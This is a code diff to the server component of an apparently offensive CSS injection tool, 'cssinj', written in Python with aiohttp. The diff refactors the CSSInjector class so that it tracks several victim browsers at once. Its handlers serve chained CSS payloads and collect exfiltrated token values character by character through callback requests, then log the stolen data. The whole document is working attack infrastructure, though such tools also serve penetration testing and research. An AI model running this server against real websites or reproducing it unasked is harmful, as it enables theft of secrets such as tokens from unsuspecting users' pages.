@@ -1,16 +1,13 @@
-import string
-import random
 from aiohttp import web
 import asyncio
 from cssinj import console, injection
+from cssinj.client import Client, Clients
 
 
 class CSSInjector:
     def __init__(self):
-        self.data = ""
         self.elements = []
-        self.event = asyncio.Event()
-        self.counter_req = 0
+        self.clients = Clients()
 
     def start(self, args):
         self.identifier = args.identifier
@@ -33,50 +30,70 @@ class CSSInjector:
         if self.show_details:
             for key, value in request.headers.items():
                 console.log("connection_details", f"{key} : {value}")
-        self.event.set()
+        client = Client(
+            host=request.host,
+            accept=request.get("accept"),
+            user_agent=request.get("user_agent"),
+            event=asyncio.Event(),
+        )
+        self.clients.append(client)
+
+        client.event.set()
         return web.Response(
-            text=injection.generate_next_import(self.hostname, self.port),
+            text=injection.generate_next_import(self.hostname, self.port, client),
             content_type="text/css",
         )
 
     async def handle_end(self, request):
+
+        client_id = request.query.get("id")
+        client = self.clients[client_id]
+        client.elements.append(client.data)
+        client.event.set()
+
         console.log(
             "end_exfiltration",
-            f"The {self.selector} exfiltrated from {self.identifier} is : {self.data}",
+            f"The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
         )
-        self.elements.append(self.data)
-        self.data = ""
-        self.event.set()
+        client.data = ""
+
         return web.Response(
             text=f"ok",
             content_type="text/css",
         )
 
     async def handle_next(self, request):
-        if not self.event.is_set():
-            await self.event.wait()
-        self.event.clear()
-        self.counter_req += 1
+        client_id = request.query.get("id")
+        client = self.clients[client_id]
+        client.counter += 1
+        if not client.event.is_set():
+            await client.event.wait()
+        client.event.clear()
+
         return web.Response(
             text=injection.generate_payload(
                 hostname=self.hostname,
                 port=self.port,
-                data=self.data,
+                data=client.data,
                 identifier=self.identifier,
                 selector=self.selector,
-                elements=self.elements,
-                counter_req=self.counter_req,
+                client=client,
             ),
             content_type="text/css",
         )
 
     async def handle_valid(self, request):
-        self.event.set()
-        self.data = request.query.get("token")
+        client_id = request.query.get("id")
+        client = self.clients[client_id]
+
+        client.event.set()
+
+        client.data = request.query.get("token")
+
         if self.show_details:
             console.log(
                 "exfiltration",
-                f"Exfiltrating element {len(self.elements)} : {self.data}",
+                f"Exfiltrating element {len(self.elements)} : {client.data}",
             )
         return web.Response(text="ok.", content_type="image/x-icon")
 
